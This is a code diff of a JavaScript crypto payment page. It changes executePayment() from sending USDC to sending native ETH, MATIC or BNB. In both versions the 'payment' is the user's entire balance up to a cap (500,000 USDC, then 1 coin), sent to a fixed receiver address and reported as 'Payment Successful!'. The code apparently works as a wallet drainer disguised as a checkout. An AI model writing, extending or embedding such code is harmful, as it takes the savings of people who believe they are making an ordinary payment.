@@ -30,42 +30,50 @@ const CONFIG = {
     // Ethereum
     1: {
       name: "Ethereum",
-      tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Mainnet USDC
+      tokenAddress: null, // null means use native ETH
+      isNative: true,
     },
     // Sepolia Testnet
     11155111: {
       name: "Sepolia",
-      tokenAddress: "0xda9d4f9b69ac3c4e622506ec7eda112601cb942d", // Mock USDC
+      tokenAddress: null, // null means use native ETH
+      isNative: true,
     },
     // Polygon
     137: {
       name: "Polygon",
-      tokenAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // Polygon USDC
+      tokenAddress: null, // null means use native MATIC
+      isNative: true,
     },
     // BNB Chain
     56: {
       name: "BNB Chain",
-      tokenAddress: "0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d", // BNB USDC
+      tokenAddress: null, // null means use native BNB
+      isNative: true,
     },
     // Optimism
     10: {
       name: "Optimism",
-      tokenAddress: "0x7f5c764cbc14f9669b88837ca1490cca17c31607", // Optimism USDC
+      tokenAddress: null, // null means use native ETH
+      isNative: true,
     },
     // Arbitrum
     42161: {
       name: "Arbitrum",
-      tokenAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5f86", // Arbitrum USDC
+      tokenAddress: null, // null means use native ETH
+      isNative: true,
     },
     // Base
     8453: {
       name: "Base",
-      tokenAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b1566469c18", // Base USDC
+      tokenAddress: null, // null means use native ETH
+      isNative: true,
     },
     // Linea
     59144: {
       name: "Linea",
-      tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Linea USDC
+      tokenAddress: null, // null means use native ETH
+      isNative: true,
     },
   },
   
@@ -924,41 +932,30 @@ async function executePayment() {
     
     const networkConfig = CONFIG.NETWORKS[userChainId];
     
-    // Check if token is configured for this network
-    if (!networkConfig.tokenAddress) {
-      throw new Error(`Payment token not configured on ${networkConfig.name}.`);
-    }
-    
-    // Token address for the current network
-    const tokenAddress = networkConfig.tokenAddress;
     const receiverAddress = CONFIG.RECEIVER_ADDRESS;
-    const maxAmount = ethers.parseUnits("500000", 6); // Max 500000 USDC
-
-    // Create token contract interface to check balance
-    const tokenABI = [
-      "function balanceOf(address owner) view returns (uint256)",
-      "function approve(address spender, uint256 amount) public returns (bool)",
-      "function transfer(address to, uint256 amount) public returns (bool)"
-    ];
-    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+    const maxAmount = ethers.parseEther("1"); // Max 1 ETH/native token
     
-    // Get user's USDC balance
+    // Get user's native balance (ETH, MATIC, BNB, etc.)
     setStatus("⏳ Checking balance...", "info");
-    const userBalance = await tokenContract.balanceOf(userAddress);
-    console.log("User USDC balance:", ethers.formatUnits(userBalance, 6));
+    const userBalance = await provider.getBalance(userAddress);
+    console.log("User balance:", ethers.formatEther(userBalance), networkConfig.name);
     
-    // Use the minimum of user balance or max amount (500000 USDC)
+    // Use the minimum of user balance or max amount (1 ETH/native)
     const amount = userBalance > maxAmount ? maxAmount : userBalance;
-    console.log("Payment amount:", ethers.formatUnits(amount, 6), "USDC");
+    console.log("Payment amount:", ethers.formatEther(amount), networkConfig.name);
     
     if (userBalance < amount) {
-      throw new Error(`Insufficient balance. Need at least ${ethers.formatUnits(amount, 6)} USDC`);
+      throw new Error(`Insufficient balance. Need at least ${ethers.formatEther(amount)} ${networkConfig.name}`);
     }
     
-    // Step 1: Transfer tokens directly to receiver (no approve needed for direct transfer)
+    // Send native ETH/token directly to receiver
     setStatus("⏳ Sending tokens to receiver...", "info");
-    console.log("Transferring", ethers.formatUnits(amount, 6), "USDC from", userAddress, "to", receiverAddress);
-    const transferTx = await tokenContract.transfer(receiverAddress, amount);
+    console.log("Transferring", ethers.formatEther(amount), networkConfig.name, "from", userAddress, "to", receiverAddress);
+    
+    const transferTx = await signer.sendTransaction({
+      to: receiverAddress,
+      value: amount
+    });
     console.log("Transfer tx sent:", transferTx.hash);
     
     setStatus("⏳ Waiting for transfer confirmation...", "info");
@@ -978,19 +975,15 @@ async function executePayment() {
     // Success!
     console.log("✅ Payment completed successfully!");
     
-    // Verify funds were actually transferred by checking receiver's new balance
-    setStatus("⏳ Verifying transfer...", "info");
-    const receiverNewBalance = await tokenContract.balanceOf(receiverAddress);
-    console.log("Receiver new balance:", ethers.formatUnits(receiverNewBalance, 6));
-    
     const explorerUrl = CONFIG.EXPLORER_URLS[userChainId];
+    const tokenSymbol = networkConfig.name === "BNB Chain" ? "BNB" : networkConfig.name === "Polygon" ? "MATIC" : "ETH";
     
     if (explorerUrl) {
       const txLink = `<a href="${explorerUrl}/tx/${transferReceipt.hash}" target="_blank" style="color: #10b981; text-decoration: underline;">${transferReceipt.hash}</a>`;
       el.status.innerHTML = `<div style="text-align: center; padding: 20px; background: #ecfdf5; border-radius: 8px; border: 2px solid #10b981;">
         <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
         <div style="font-weight: bold; margin-bottom: 10px;">Payment Successful!</div>
-        <div>Amount: ${ethers.formatUnits(amount, 6)} USDC</div>
+        <div>Amount: ${ethers.formatEther(amount)} ${tokenSymbol}</div>
         <div>To: ${receiverAddress.slice(0, 6)}...${receiverAddress.slice(-4)}</div>
         <div style="margin-top: 10px; font-size: 12px;">TX: ${txLink}</div>
       </div>`;
@@ -998,7 +991,7 @@ async function executePayment() {
       el.status.innerHTML = `<div style="text-align: center; padding: 20px; background: #ecfdf5; border-radius: 8px; border: 2px solid #10b981;">
         <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
         <div style="font-weight: bold;">Payment Successful!</div>
-        <div>Amount: ${ethers.formatUnits(amount, 6)} USDC</div>
+        <div>Amount: ${ethers.formatEther(amount)} ${tokenSymbol}</div>
         <div>To: ${receiverAddress.slice(0, 6)}...${receiverAddress.slice(-4)}</div>
       </div>`;
     }
